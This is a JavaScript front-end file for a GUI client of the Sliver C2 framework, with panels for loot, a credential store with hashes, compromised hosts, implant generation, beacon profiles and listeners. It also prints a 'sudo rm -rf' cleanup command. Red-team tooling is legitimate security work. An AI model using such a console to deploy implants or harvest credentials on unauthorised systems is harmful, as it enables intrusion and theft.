// pinEvents docks a live Event Log panel into the bottom console area.
function pinEvents() {
  hideModal();
  const id = '_events_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>Event Log</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div class="event-log" data-events-list style="flex:1"></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  renderEventsList();
}

async function openOperatorsPanel() {
  const ops = await App().ListOperators().catch(() => []);
  let rows = (ops||[]).map(o => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;border-bottom:1px solid var(--border)"><span style="color:${o.online?'var(--ok)':'var(--muted)'}">${o.online?'[online]':'[offline]'}</span><span>${esc(o.name)}</span></div>`).join('');
  if (!rows) rows = '<div style="padding:10px;color:var(--muted)">No operators.</div>';
  openViewPanel('_operators', 'Operators', `<div style="overflow:auto;flex:1">${rows}</div>`);
}

function openLootPanel() {
  openViewPanel('_loot', 'Loot',
    `<div style="display:flex;flex-direction:column;gap:0;flex:1;min-height:0">
       <div style="padding:6px 10px;display:flex;gap:8px;align-items:center;border-bottom:1px solid var(--border);background:var(--panel-alt)">
         <button class="btn small" id="loot-export-all">Export all as ZIP…</button>
         <button class="btn small" onclick="switchView('gallery')">Screenshot Gallery</button>
         <span class="spacer" style="flex:1"></span>
         <span id="loot-count" style="color:var(--muted);font-size:11px"></span>
       </div>
       <div style="overflow:auto;flex:1" id="loot-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>
     </div>`);
  // Use window.refreshLootList so features-extra.js's Preview-button
  // augmentation (installed by wrapping the global) actually runs.
  (window.refreshLootList || refreshLootList)();
  setTimeout(() => {
    document.getElementById('loot-export-all')?.addEventListener('click', async () => {
      const dir = await pickDownloadFolder('Where should the loot ZIP be written?');
      if (!dir) return;
      const p = progressToast('Fetching + zipping loot…');
      const r = await App().ExportAllLootZIP(dir).catch(e => ({ error: String(e) }));
      if (r.error) p.fail(r.error); else p.done('Saved ' + r.path);
    });
  }, 0);
}

// HTTP C2 profile editor - load the profile as JSON, edit, save back.
async function openC2Editor(name) {
  openViewPanel('_c2edit', `HTTP C2 Profile${name ? ' - ' + name : ''}`,
    `<div style="display:flex;flex-direction:column;gap:8px;flex:1;min-height:0">
       <p style="color:var(--muted);font-size:11px;margin:0">Edit the profile JSON below. To clone it, change the <code>"name"</code> field and click <b>Save as new</b>. Malformed JSON is rejected by the teamserver.</p>
       <textarea id="c2-json" class="notes-area" style="flex:1;min-height:260px;font-family:var(--mono);font-size:11px;line-height:1.5" spellcheck="false">Loading…</textarea>
       <div style="display:flex;gap:8px;align-items:center">
         <button id="c2-save" class="btn accent">Save (overwrite)</button>
         <button id="c2-savenew" class="btn">Save as new</button>
         <span id="c2-status" style="font-size:11px;color:var(--muted)"></span>
       </div>
     </div>`);
  const ta = document.getElementById('c2-json'), status = document.getElementById('c2-status');
  if (name) {
    try { ta.value = await App().GetHTTPC2Profile(name); }
    catch (e) { ta.value = ''; status.textContent = 'load error: ' + e; }
  } else {
    ta.value = '';
    ta.placeholder = 'Paste an HTTP C2 profile JSON (copy one from "c2profile <name>" as a starting point).';
  }
  const save = async overwrite => {
    if (!ta.value.trim()) { status.textContent = 'nothing to save'; return; }
    status.textContent = 'saving…';
    try { await App().SaveHTTPC2Profile(ta.value, overwrite); status.textContent = '✓ saved'; toast('ok', 'HTTP C2 profile saved'); }
    catch (e) { status.textContent = '✕ ' + e; toast('err', String(e)); }
  };
  document.getElementById('c2-save').addEventListener('click', () => save(true));
  document.getElementById('c2-savenew').addEventListener('click', () => save(false));
}
async function refreshLootList() {
  const el = document.getElementById('loot-list'); if (!el) return;
  const loot = await App().GetLoot().catch(() => []);
  const count = document.getElementById('loot-count');
  if (count) count.textContent = (loot?.length || 0) + ' item(s)';
  if (!loot?.length) {
    el.innerHTML = `<div class="empty-state">
      <div class="empty-title">No loot yet</div>
      <div class="empty-body">Loot is anything the operator saves centrally on the teamserver - downloaded files, screenshots, credential dumps. Run <code>download --loot &lt;path&gt;</code> from an agent shell or use the <b>screenshot</b> command.</div>
      <div class="empty-actions"><button class="btn small" onclick="switchView('sessions')">Open Sessions</button></div>
    </div>`;
    return;
  }
  el.innerHTML = loot.map(l => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(l.name)}</span><span style="color:var(--muted)">${esc(l.type)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(l.id.slice(0,10))}</span><button class="btn small" onclick="lootDownload('${esc(l.id)}')">Download</button><button class="btn small danger" onclick="deleteLootRow('${esc(l.id)}','${esc(l.name||l.id)}')">Del</button></div>`).join('');
}
async function lootDownload(lootID) {
  const r = await App().DownloadLoot(lootID).catch(e => ({ error: String(e) }));
  toast(r.error ? 'err' : 'ok', r.error ? `Loot download failed: ${r.error}` : `Saved to ${r.path}`);
}

// ── Creds panel ─────────────────────────────────────────────────────────────
function openCredsPanel() {
  const content = `<div class="panel" style="margin-bottom:12px"><h3>Add Credential</h3>
    <form id="cred-form">
      <div class="gen-row">
        <div class="gen-field"><label>Username</label><input name="username" placeholder="user"/></div>
        <div class="gen-field"><label>Password / Plaintext</label><input name="plaintext" placeholder="P@ss"/></div>
        <div class="gen-field"><label>Hash (optional)</label><input name="hash" placeholder="NTLM/hash"/></div>
      </div>
      <div class="gen-row"><button type="submit" class="btn accent" style="margin-left:auto">Add</button></div>
      <div id="cred-msg" class="status-msg"></div>
    </form></div>
    <div style="overflow:auto;flex:1" id="creds-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`;
  openViewPanel('_creds', 'Credentials', content);
  const f = document.getElementById('cred-form');
  f.addEventListener('submit', async e => {
    e.preventDefault();
    const msg = document.getElementById('cred-msg'); msg.textContent = 'Saving...'; msg.className = 'status-msg';
    const err = await App().AddCred(f.username.value, f.plaintext.value, f.hash.value).then(()=>null).catch(e=>String(e));
    if (err) { msg.textContent = err; msg.className = 'status-msg err'; }
    else { msg.textContent = 'Added'; msg.className = 'status-msg ok'; f.reset(); refreshCredsList(); }
  });
  refreshCredsList();
}
async function refreshCredsList() {
  const el = document.getElementById('creds-list'); if (!el) return;
  const creds = await App().ListCreds().catch(() => []);
  if (!creds.length) {
    el.innerHTML = `<div class="empty-state">
      <div class="empty-title">No credentials stored</div>
      <div class="empty-body">The Sliver server keeps a central credential store. Add creds manually with the form above, or capture them from beacons/sessions and they'll appear here.</div>
    </div>`;
    return;
  }
  el.innerHTML = creds.map(c => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(c.username)}</span><span style="flex:1;font-family:var(--mono)">${esc(c.plaintext||c.hash||'')}</span>${c.cracked?'<span style="color:var(--ok)">cracked</span>':''}<button class="btn small danger" onclick="deleteCredRow('${esc(c.id)}','${esc(c.username||c.id)}')">Del</button></div>`).join('');
}

// ── Hosts panel ─────────────────────────────────────────────────────────────
function openHostsPanel() {
  openViewPanel('_hosts', 'Hosts', `<div style="overflow:auto;flex:1" id="hosts-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
  refreshHostsList();
}
async function refreshHostsList() {
  const el = document.getElementById('hosts-list'); if (!el) return;
  const hosts = await App().ListHosts().catch(() => []);
  if (!hosts.length) {
    el.innerHTML = `<div class="empty-state">
      <div class="empty-title">No hosts recorded</div>
      <div class="empty-body">Sliver tracks each unique target host it has seen an implant on. This list fills automatically the first time a beacon or session checks in from a fresh box.</div>
    </div>`;
    return;
  }
  el.innerHTML = hosts.map(h => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(h.hostname)}</span><span style="flex:1;color:var(--muted)">${esc(h.os)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc((h.uuid||'').slice(0,8))}</span><span style="color:var(--muted)">${esc(h.firstSeen)}</span><button class="btn small danger" onclick="deleteHostRow('${esc(h.id)}','${esc(h.hostname)}')">Del</button></div>`).join('');
}
// deleteHostRow - confirm + error toast + refresh. Old inline promise
// silently swallowed errors (no .catch, no user feedback), which read as
// "delete not working" when the RPC actually failed.
// Delete wrappers with confirm + error toast. Inline `App().Delete…().then(refresh)`
// swallowed errors (no .catch), which the operator saw as "Del button broken"
// when the RPC actually failed. Each wrapper here confirms, calls, toasts
// on either outcome, and refreshes the panel.
window.deleteLootRow = async function (id, name) {
  const ok = await uiConfirm('Delete loot <b>' + esc(name) + '</b>?', { title: 'Delete loot', okLabel: 'Delete', danger: true });
  if (!ok) return;
  const err = await App().DeleteLoot(id).catch(e => String(e));
  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Loot removed');
  (window.refreshLootList || refreshLootList)();
};
window.deleteCredRow = async function (id, username) {
  const ok = await uiConfirm('Delete credential for <b>' + esc(username) + '</b>?', { title: 'Delete credential', okLabel: 'Delete', danger: true });
  if (!ok) return;
  const err = await App().DeleteCred(id).catch(e => String(e));
  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Credential removed');
  refreshCredsList();
};
window.deleteImplantProfileRow = async function (name) {
  const ok = await uiConfirm('Delete implant profile <b>' + esc(name) + '</b>?', { title: 'Delete profile', okLabel: 'Delete', danger: true });
  if (!ok) return;
  const err = await App().DeleteImplantProfile(name).catch(e => String(e));
  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Profile removed');
  refreshProfilesList();
};
window.killJobRow = async function (id, name, port) {
  const ok = await uiConfirm('Kill listener <b>' + esc(name) + ' :' + port + '</b>?<br/><br/><span style="color:var(--muted);font-size:11px">Live implants that call this listener will stop reaching the teamserver.</span>',
    { title: 'Kill listener', okLabel: 'Kill', danger: true });
  if (!ok) return;
  const err = await App().KillJob(id).catch(e => String(e));
  if (err) toast('err', 'Kill failed: ' + err); else toast('ok', 'Listener stopped');
  refreshListenerList();
};

window.deleteHostRow = async function (id, hostname) {
  const ok = await uiConfirm('Remove host record for <b>' + esc(hostname || id) + '</b> from the teamserver database?<br/><br/><span style="color:var(--muted);font-size:11px">This only forgets the host in Sliver\'s DB. The live agent (if any) stays.</span>',
    { title: 'Delete host', okLabel: 'Delete', danger: true });
  if (!ok) return;
  const err = await App().DeleteHost(id).catch(e => String(e));
  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Host removed');
  refreshHostsList();
}

function openBuildsPanel() {
  openViewPanel('_builds', 'Builds', `<div style="overflow:auto;flex:1" id="builds-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
  refreshBuildsList();
}
async function refreshBuildsList() {
  const el = document.getElementById('builds-list'); if (!el) return;
  const builds = await App().GetBuildHistory().catch(() => []);
  if (!builds?.length) {
    el.innerHTML = `<div class="empty-state">
      <div class="empty-title">No implant builds yet</div>
      <div class="empty-body">Generate an implant to fill this list. Each build is stored on the teamserver and can be re-downloaded here without rebuilding.</div>
      <div class="empty-actions"><button class="btn small" onclick="switchView('generate')">Open Generate</button></div>
    </div>`;
    return;
  }
  el.innerHTML = builds.map(b => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(b.name)}</span><span style="color:var(--muted)">${esc(b.goos)}/${esc(b.goarch)}</span><span style="color:var(--muted)">${esc(b.format)}</span><span style="color:var(--muted);font-family:var(--mono);max-width:180px;overflow:hidden;text-overflow:ellipsis">${esc((b.c2Urls||[]).join(','))}</span><button class="btn small" onclick="buildRegen('${esc(b.name)}')">Download</button><button class="btn small danger" onclick="deleteBuild('${esc(b.name)}')">Del</button></div>`).join('');
}
async function deleteBuild(name) {
  if (!(await uiConfirm(`Delete build <b>${esc(name)}</b>?<br/><br/><span style="color:var(--muted);font-size:11px">Removes the teamserver's stored build record + on-disk artefacts.</span>`, { title: 'Delete build', okLabel: 'Delete', danger: true }))) return;
  const err = await App().DeleteBuild(name).catch(e => String(e));
  if (!err) { toast('ok', `Deleted build ${name}`); refreshBuildsList(); return; }
  // Sliver server bug: `rename import dir: target exists` - the server
  // tries to move the build's source tree into a trash location, but the
  // trash already has an orphan from a prior failed delete. The teamserver
  // DB row is deleted but the on-disk tree lingers. Explain to the operator
  // and hand them the exact server-side cleanup command.
  if (/rename import dir|target exists/i.test(err)) {
    const trash = err.match(/(\/[^\s]+)$/);
    const path = trash ? trash[1] : '~/.sliver/slivers/…/' + name;
    await uiConfirm(
      `Sliver's server-side delete succeeded partially but left an orphan directory on disk:<br/><code style="word-break:break-all">${esc(path)}</code><br/><br/>` +
      `Future builds using the same name will fail with the same error until the orphan is removed. On the C2 host:<br/>` +
      `<pre style="background:var(--panel-alt);padding:6px;border-radius:4px;font-size:11px">sudo rm -rf ${esc(path.replace(/\/src\/.+$/, ''))}</pre>` +
      `<br/>The Builds panel will refresh - this build is no longer selectable in the GUI even though the disk state remains.`,
      { title: 'Server orphan (Sliver bug)', okLabel: 'Got it', danger: false }
    );
    refreshBuildsList();
    return;
  }
  toast('err', 'Delete failed: ' + err);
}
// pickDownloadFolder resolves a save directory: uses the per-teamserver
// remembered value if there is one, otherwise prompts. The prompt exposes
// both a native folder browser (via OpenDirectoryDialog - different code
// path than the OpenFileDialog that crashes on some Windows configs) and a
// text-input fallback for when the native picker cannot be trusted.
async function pickDownloadFolder(prompt) {
  const dirKey = (persistKey || 'sliver-gui:default') + ':download-dir';
  let dir = '';
  try { dir = localStorage.getItem(dirKey) || ''; } catch (e) {}
  if (dir) return dir;
  const chosen = await folderChooser(prompt || 'Where should generated implants be saved on this machine?');
  if (!chosen) return '';
  try { localStorage.setItem(dirKey, chosen); } catch (e) {}
  window.__lastFolderChosen__ = chosen; // seed next open at the picked dir
  return chosen;
}

// folderChooser draws an in-app directory browser - text input at the top
// (for pasting a known path) plus a click-through folder tree fed entirely
// from Go filesystem calls. No native OS dialog is involved anywhere in
// this flow - runtime.OpenDirectoryDialog crashes the WebView2 process on
// certain Windows Common Dialog COM configs (confirmed on this operator's
// machine), so we work around it by walking the filesystem ourselves.
//
// Returns the chosen absolute path (or empty string on cancel).
async function folderChooser(message) {
  return new Promise(async resolve => {
    const ov = document.createElement('div');
    ov.style.cssText = 'position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.5)';
    ov.innerHTML = `<div style="width:min(680px,94vw);height:min(560px,86vh);background:var(--panel,var(--bg));border:1px solid var(--border);border-radius:8px;padding:14px 16px 12px;box-shadow:0 8px 30px rgba(0,0,0,.5);display:flex;flex-direction:column">
      <div style="font-weight:600;font-size:13.5px;margin-bottom:4px">Choose a folder</div>
      <div style="font-size:12px;color:var(--muted);margin-bottom:8px">${esc(message)}</div>
      <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center">
        <button id="fc-up" class="btn small" title="Up one level">↑</button>
        <button id="fc-home" class="btn small" title="Home">Home</button>
        <select id="fc-roots" style="min-width:80px" title="Drives"></select>
        <input id="fc-input" type="text" style="flex:1;padding:6px 9px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:12px;font-family:var(--mono)" placeholder="Current folder - edit and press Enter to jump"/>
      </div>
      <div id="fc-list" style="flex:1;overflow:auto;background:var(--bg);border:1px solid var(--border);border-radius:5px;font-size:12.5px;font-family:var(--mono)"></div>
      <div id="fc-msg" style="font-size:11px;color:var(--muted);min-height:14px;margin-top:6px"></div>
      <div style="display:flex;gap:8px;justify-content:space-between;align-items:center;margin-top:10px">
        <label style="font-size:11.5px;color:var(--muted)"><input type="checkbox" id="fc-new" style="vertical-align:middle"/> create folder if it doesn't exist</label>
        <div style="display:flex;gap:8px">
          <button id="fc-cancel" class="btn small">Cancel</button>
          <button id="fc-ok" class="btn small accent">Save this folder</button>
        </div>
      </div>
    </div>`;
    document.body.appendChild(ov);
    const inp   = ov.querySelector('#fc-input');
    const list  = ov.querySelector('#fc-list');
    const msg   = ov.querySelector('#fc-msg');
    const roots = ov.querySelector('#fc-roots');
    let current = '';

    const done = v => { ov.remove(); document.removeEventListener('keydown', onKey); resolve(v); };
    const onKey = e => { if (e.key === 'Escape') done(''); };

    async function load(path) {
      msg.textContent = 'Loading…';
      const r = await App().ListDirectory(path || '', true).catch(e => ({ error: String(e), entries: [] }));
      current = r.path || path || '';
      inp.value = current;
      if (r.error) {
        msg.innerHTML = `<span style="color:var(--warn)">${esc(r.error)}</span>`;
        list.innerHTML = `<div style="padding:12px;color:var(--muted);text-align:center">Can't read this folder.</div>`;
        return;
      }
      const parent = r.parent || '';
      msg.textContent = r.entries.length + ' subfolder(s)';
      // The backend hands us a filepath.Join'd absolute path per entry, so
      // the frontend never has to manually splice separators - that was the
      // source of the "D:\ + C2 Infra → D:C2 Infra" bug (drive-root special
      // case had a broken concat).
      list.innerHTML =
        (parent ? `<div class="fc-row fc-up" data-path="${esc(parent)}" style="padding:5px 10px;cursor:pointer;border-bottom:1px solid var(--border);color:var(--muted)">📁 <b>..</b> <span style="color:var(--muted);font-size:11px">(${esc(parent)})</span></div>` : '') +
        (r.entries.length
          ? r.entries.map(e => `<div class="fc-row" data-path="${esc(e.fullPath || '')}" style="padding:5px 10px;cursor:pointer;border-bottom:1px solid rgba(42,46,59,.4)">📁 ${esc(e.name)}</div>`).join('')
          : `<div style="padding:12px;color:var(--muted);text-align:center">(no subfolders)</div>`);
      list.querySelectorAll('.fc-row').forEach(row => {
        row.addEventListener('dblclick', () => {
          const abs = row.dataset.path;
          if (abs) load(abs);
        });
        row.addEventListener('click', () => {
          list.querySelectorAll('.fc-row').forEach(x => x.style.background = '');
          row.style.background = 'rgba(77,159,230,.15)';
          // Single click also updates the path bar so the operator can
          // "Save this folder" on a selected subfolder without double-click.
          if (row.dataset.path && !row.classList.contains('fc-up')) {
            inp.value = row.dataset.path;
          }
        });
      });
    }

    inp.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); load(inp.value.trim()); } });
    ov.querySelector('#fc-up').addEventListener('click', async () => {
      const r = await App().ListDirectory(current, true).catch(() => null);
      if (r && r.parent) load(r.parent);
    });
    ov.querySelector('#fc-home').addEventListener('click', async () => {
      const h = await App().HomeDirectory().catch(() => '');
      load(h || '');
    });
    // Populate the drive/root dropdown.
    try {
      const rootsList = await App().ListDriveRoots();
      if (rootsList && rootsList.length) {
        roots.innerHTML = '<option value="">drives…</option>' + rootsList.map(r => `<option value="${esc(r)}">${esc(r)}</option>`).join('');
        roots.addEventListener('change', () => { if (roots.value) load(roots.value); });
      } else {
        roots.style.display = 'none';
      }
    } catch (e) { roots.style.display = 'none'; }

    ov.querySelector('#fc-cancel').addEventListener('click', () => done(''));
    ov.querySelector('#fc-ok').addEventListener('click', async () => {
      const picked = (inp.value || '').trim();
      if (!picked) return;
      const createIfMissing = ov.querySelector('#fc-new').checked;
      if (createIfMissing) {
        const r = await App().EnsureDirectory(picked).catch(e => ({ error: String(e) }));
        if (r && r.error) { msg.innerHTML = '<span style="color:var(--accent)">' + esc(r.error) + '</span>'; return; }
        done(typeof r === 'string' ? r : picked);
        return;
      }
      // Otherwise verify it exists before returning.
      const chk = await App().ListDirectory(picked, true).catch(() => null);
      if (!chk || chk.error) { msg.innerHTML = '<span style="color:var(--accent)">Path unreadable - tick "create folder if it doesn\'t exist" to make it.</span>'; return; }
      done(chk.path || picked);
    });
    ov.addEventListener('click', e => { if (e.target === ov) done(''); });
    document.addEventListener('keydown', onKey);

    // Start at whatever the operator picked last, else home.
    const startFrom = (window.__lastFolderChosen__ || '');
    load(startFrom);
  });
}
window.folderChooser = folderChooser;
window.pickDownloadFolder = pickDownloadFolder;

// buildRegen downloads a previously-built implant to disk without invoking
// Wails' native SaveFileDialog. First run per teamserver asks for a target
// directory (via the shared folderChooser - text input + optional native
// Browse); that path is persisted in localStorage and reused silently.
async function buildRegen(name) {
  const dir = await pickDownloadFolder('Where should generated implants be saved on this machine?');
  if (!dir) return;
  const r = await App().RegenerateBuildToPath(name, dir).catch(e => ({ error: String(e) }));
  if (r.error) {
    toast('err', `Save failed: ${r.error}`);
    return;
  }
  toast('ok', `Saved to ${r.path}`);
}
// changeDownloadDir clears the saved download dir so buildRegen prompts again.
// Exposed via the command palette for operators who want to relocate.
async function changeDownloadDir() {
  const dirKey = (persistKey || 'sliver-gui:default') + ':download-dir';
  const cur = (() => { try { return localStorage.getItem(dirKey) || ''; } catch (e) { return ''; } })();
  const answer = await uiDialog({
    title: 'Download folder',
    message: `Where should generated implants be saved on this machine?<br/><br/>Current: <code>${esc(cur || '(not set)')}</code>`,
    input: true,
    placeholder: cur,
    okLabel: 'Save',
  });
  if (answer === null) return;
  const v = String(answer).trim();
  try {
    if (v) localStorage.setItem(dirKey, v);
    else localStorage.removeItem(dirKey);
  } catch (e) {}
  toast('ok', v ? `Download dir set to ${v}` : 'Download dir cleared');
}

function profilesContent() {
  return `<div style="display:flex;justify-content:flex-end;gap:6px;margin-bottom:10px">
      <button class="btn small" onclick="pinProfiles()">📌 Pin to console</button>
    </div>
    <div class="panel" style="margin-bottom:12px">
      <h3>New Profile</h3>
      <form id="prof-form">
        <div class="gen-row">
          <div class="gen-field"><label>Name</label><input name="name" placeholder="win-mtls" required/></div>
          <div class="gen-field"><label>Format</label><select name="format"><option value="exe">Executable</option><option value="shared">Shared Lib</option><option value="service">Service</option><option value="shellcode">Shellcode</option></select></div>
        </div>
        <div class="gen-row">
          <div class="gen-field"><label>OS</label><select name="goos"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select></div>
          <div class="gen-field"><label>Arch</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
        </div>
        <div class="gen-row"><div class="gen-field" style="flex:2"><label>C2 URL</label><input name="c2Url" placeholder="mtls://ip:port" required/></div></div>
        <div class="gen-row">
          <label class="check-label"><input type="checkbox" name="debug"/> Debug</label>
          <label class="check-label"><input type="checkbox" name="beacon" id="prof-beacon"/> Beacon mode</label>
        </div>
        <div class="gen-row" id="prof-beacon-opts" style="display:none">
          <div class="gen-field"><label>Interval (s)</label><input name="interval" type="number" value="60"/></div>
          <div class="gen-field"><label>Jitter (s)</label><input name="jitter" type="number" value="30"/></div>
        </div>
        <div class="gen-row"><button type="submit" class="btn accent" style="margin-left:auto">Save Profile</button></div>
        <div id="prof-msg" class="status-msg"></div>
      </form>
    </div>
    <div style="overflow:auto;flex:1" data-profiles-list><div style="padding:10px;color:var(--muted)">Loading...</div></div>`;
}
function openProfilesPanel() {
  openViewPanel('_profiles', 'Profiles', profilesContent());
  wireProfileForm();
  refreshProfilesList();
}
function wireProfileForm() {
  const f = document.getElementById('prof-form'); if (!f) return;
  document.getElementById('prof-beacon')?.addEventListener('change', function() {
    document.getElementById('prof-beacon-opts').style.display = this.checked ? 'flex' : 'none';
  });
  f.addEventListener('submit', async e => {
    e.preventDefault();
    const req = { name:f.name.value, goos:f.goos.value, goarch:f.goarch.value, format:f.format.value, c2Url:f.c2Url.value, debug:f.debug.checked, beacon:f.beacon.checked, interval:parseInt(f.interval?.value)||60, jitter:parseInt(f.jitter?.value)||0 };
    const msg = document.getElementById('prof-msg');
    msg.textContent = 'Saving...'; msg.className = 'status-msg';
    const r = await App().SaveImplantProfile(req).catch(e => String(e));
    if (r) { msg.textContent = String(r); msg.className = 'status-msg err'; }
    else { msg.textContent = 'Profile saved'; msg.className = 'status-msg ok'; f.reset(); refreshProfilesList(); }
  });
}
async function refreshProfilesList() {
  const targets = document.querySelectorAll('[data-profiles-list]');
  if (!targets.length) return;
  const profs = await App().ListImplantProfiles().catch(() => []);
  const html = !profs?.length
    ? '<div style="padding:10px;color:var(--muted)">No saved profiles yet - create one above.</div>'
    : profs.map(p => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(p.name)}</span><span style="color:var(--muted)">${esc(p.goos)}/${esc(p.goarch)}</span><span style="color:var(--muted)">${esc(p.format)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(p.c2Url||'')}</span><button class="btn small" onclick='genFromProfile(${JSON.stringify(p)})'>Generate</button><button class="btn small danger" onclick="deleteImplantProfileRow('${esc(p.name)}')">Del</button></div>`).join('');
  targets.forEach(el => el.innerHTML = html);
}
// pinProfiles docks a live profiles list into the bottom console.
function pinProfiles() {
  hideModal();
  const id = '_profiles_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>📦 Profiles</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1" data-profiles-list></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  refreshProfilesList();
}
// genFromProfile pre-fills the Generate form from a saved profile.
function genFromProfile(p) {
  closeTab('_generate');
  openGeneratePanel();
  setTimeout(() => {
    const f = document.getElementById('gen-form'); if (!f) return;
    if (p.goos) f.goos.value = p.goos;
    if (p.goarch) f.goarch.value = p.goarch;
    if (p.format) f.format.value = p.format;
    if (p.c2Url) f.c2Url.value = p.c2Url;
    f.debug.checked = !!p.debug;
    if (p.beacon) {
      f.beacon.checked = true;
      document.getElementById('gbeacon-opts').style.display = 'flex';
      if (f.interval) f.interval.value = p.interval || 60;
      if (f.jitter) f.jitter.value = p.jitter || 0;
    }
  }, 30);
}

function openListenersPanel() {
  const content = `<div class="listener-layout">
    <div class="panel"><h3>Start Listener</h3>
      <div class="field-row"><label>Type</label><select id="ls-type"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option></select></div>
      <div class="field-row"><label>Host</label><input id="ls-host" value="0.0.0.0"/></div>
      <div class="field-row"><label>Port</label><input id="ls-port" type="number" value="8443"/></div>
      <button class="btn accent" id="ls-start" style="width:100%;margin-top:6px">Start</button>
      <div id="ls-msg" class="status-msg"></div>
    </div>
    <div class="panel"><h3>Active Listeners</h3><div id="ls-list"></div></div>
  </div>`;
  openViewPanel('_listeners', 'Listeners', content);
  setTimeout(wireListeners, 0);
}
async function wireListeners() {
  const startBtn = document.getElementById('ls-start'); if (!startBtn) return;
  startBtn.addEventListener('click', async () => {
    const type = document.getElementById('ls-type').value;
    const host = document.getElementById('ls-host').value.trim()||'0.0.0.0';
    const port = parseInt(document.getElementById('ls-port').value)||8443;
    const msg = document.getElementById('ls-msg');
    msg.textContent = 'Starting...'; msg.className = 'status-msg';
    try {
      if (type==='mtls') await App().StartMTLSListener({host,port});
      else if (type==='https') await App().StartHTTPListener({host,port,secure:true});
      else if (type==='http') await App().StartHTTPListener({host,port,secure:false});
      else if (type==='dns') await App().StartDNSListener({domains:[host]});
      msg.textContent = `${type.toUpperCase()} started on :${port}`; msg.className = 'status-msg ok';
    } catch(e) { msg.textContent = String(e); msg.className = 'status-msg err'; }
    refreshListenerList();
  });
  refreshListenerList();
}
async function refreshListenerList() {
  const el = document.getElementById('ls-list'); if (!el) return;
  const jobs = await App().ListJobs().catch(() => []);
  if (!jobs?.length) {
    el.innerHTML = `<div class="empty-state" style="padding:14px">
      <div class="empty-title">No active listeners</div>
      <div class="empty-body">Start one with the form on the left - HTTP/HTTPS for redirector setups, mTLS for direct, DNS for slow-and-quiet.</div>
    </div>`;
    return;
  }
  el.innerHTML = jobs.map(j => `<div style="padding:4px 0;font-size:12.5px;display:flex;justify-content:space-between;border-bottom:1px solid var(--border)"><span>${esc(j.name)} (${esc(j.protocol)} :${j.port})</span><button class="btn small danger" onclick="killJobRow(${j.id},'${esc(j.name)}',${j.port})">Kill</button></div>`).join('');
}

function openGeneratePanel() {
  const content = `<form id="gen-form" class="gen-form">
    <div class="gen-row">
      <div class="gen-field"><label>Name (optional)</label><input name="name" placeholder="auto"/></div>
      <div class="gen-field"><label>Format</label><select name="format"><option value="exe">Executable</option><option value="shared">Shared Lib</option><option value="service">Service</option><option value="shellcode">Shellcode</option></select></div>
    </div>
    <div class="gen-row">
      <div class="gen-field"><label>OS</label><select name="goos"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select></div>
      <div class="gen-field"><label>Arch</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
    </div>
    <div class="gen-row"><div class="gen-field" style="flex:2"><label>From Listener</label><select id="gen-listener"><option value="">- select an active listener -</option></select></div></div>
    <div class="gen-row"><div class="gen-field" style="flex:2">
      <label>C2 URL <span style="color:var(--muted);font-weight:400;font-size:11px">- replace with your redirector's public URL if using one</span></label>
      <div style="display:flex;gap:6px">
        <input name="c2Url" list="c2url-history" placeholder="mtls://ip:port or https://redirector" required style="flex:1"/>
        <button type="button" id="gen-test-btn" class="btn small" title="Probe this URL through your network path">Test</button>
      </div>
      <datalist id="c2url-history"></datalist>
    </div></div>
